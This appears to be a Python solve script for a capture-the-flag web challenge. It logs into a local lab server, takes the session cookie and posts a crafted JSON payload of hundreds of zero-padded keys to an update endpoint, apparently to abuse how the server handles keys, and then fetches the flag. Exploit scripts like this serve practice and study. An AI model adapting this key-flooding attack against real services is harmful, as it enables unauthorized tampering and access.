import requests
import json

url="http://127.0.0.1:57782/"
PAYLOAD="Holactf"
NUMBER_OF_BITS = 32*16
KEY_IN_PAYLOAD = "1"
#login
data={
    "username": "kou"
}

response=requests.post(url, data=data, allow_redirects=None)

print("Login.......")
session=response.headers.get('Set-Cookie').split("session=")[1].split(";")[0]
cookie={
    "session": f"{session}"
}
print(f"Session: {session}")
response=requests.get(url+"dashboard", cookies=cookie)

#Create payload
data = {
    "data": {
        "0"*i+KEY_IN_PAYLOAD: PAYLOAD if i == 0 else "something"
        for i in range(NUMBER_OF_BITS)
    }
}

# Send payload
endpoint="update"
response=requests.post(url+endpoint, json=data, cookies=cookie)
print("Update.......")
print(response.text)
      
#submit
endpoint="get_flag"
response=requests.get(url+endpoint, cookies=cookie)
print("Find flag.......")
print(response.text)
